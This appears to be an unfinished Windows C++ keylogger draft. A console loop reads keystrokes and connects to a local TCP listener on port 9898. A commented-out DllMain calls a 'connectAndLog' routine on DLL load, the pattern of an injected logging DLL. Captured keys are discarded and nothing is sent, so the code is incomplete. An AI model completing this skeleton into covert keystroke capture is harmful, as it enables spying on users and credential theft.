//#define DLL_EXPORT
#include "logger.h"
#include <Windows.h>
#include <iostream>
#include <WinSock2.h>
#include <string>
#include <conio.h>

int main()
{
	// we connect to server that uses TCP. thats why SOCK_STREAM & IPPROTO_TCP
	SOCKET _clientSocket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);

	if (_clientSocket == INVALID_SOCKET)
		std::cout << "cant connect 1" << std::endl;

	struct sockaddr_in sa = { 0 };

	sa.sin_port = htons(9898); // port that server will listen to
	sa.sin_family = AF_INET;   // must be AF_INET
	sa.sin_addr.s_addr = inet_addr("127.0.0.1");    // the IP of the server / current

	// the process will not continue until the server accepts the client
	int status = connect(_clientSocket, (struct sockaddr*)&sa, sizeof(sa));

	if (status == INVALID_SOCKET)
		std::cout << "cant connect 2" << std::endl;

	char c = '\0';

	while (1) {
		if (kbhit()) {
			c = getch();
		}
		/* If a key has been pressed */
		if (c != '\0') {

			c = '\0'; // and put it back to \0
		}

	}
}
//extern "C"
//{
//	DECLDIR void connectAndLog() {
//		// we connect to server that uses TCP. thats why SOCK_STREAM & IPPROTO_TCP
//		SOCKET _clientSocket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
//
//		if (_clientSocket == INVALID_SOCKET)
//			std::cout << "cant connect 1" << std::endl;
//
//		struct sockaddr_in sa = { 0 };
//
//		sa.sin_port = htons(9898); // port that server will listen to
//		sa.sin_family = AF_INET;   // must be AF_INET
//		sa.sin_addr.s_addr = inet_addr("127.0.0.1");    // the IP of the server / current
//
//		// the process will not continue until the server accepts the client
//		int status = connect(_clientSocket, (struct sockaddr*)&sa, sizeof(sa));
//
//		if (status == INVALID_SOCKET)
//			std::cout << "cant connect 2" << std::endl;
//
//		char c = '\0';
//
//		while (1) {
//			if (kbhit()) {
//				c = getch();
//			}
//			/* If a key has been pressed */
//			if (c != '\0') {
//				
//				c = '\0'; // and put it back to \0
//			}
//
//		}
//
//	}
//}


//BOOL APIENTRY DllMain(HINSTANCE hModule, // Handle to DLL modul
//	DWORD ul_reason_for_call,
//	LPVOID lpReserved) // Reserved
//
//{
//	switch (ul_reason_for_call)
//	{
//	case DLL_PROCESS_ATTACH:
//		DisableThreadLibraryCalls(hModule);
//		connectAndLog();
//		break;
//	}
//	return TRUE;
//}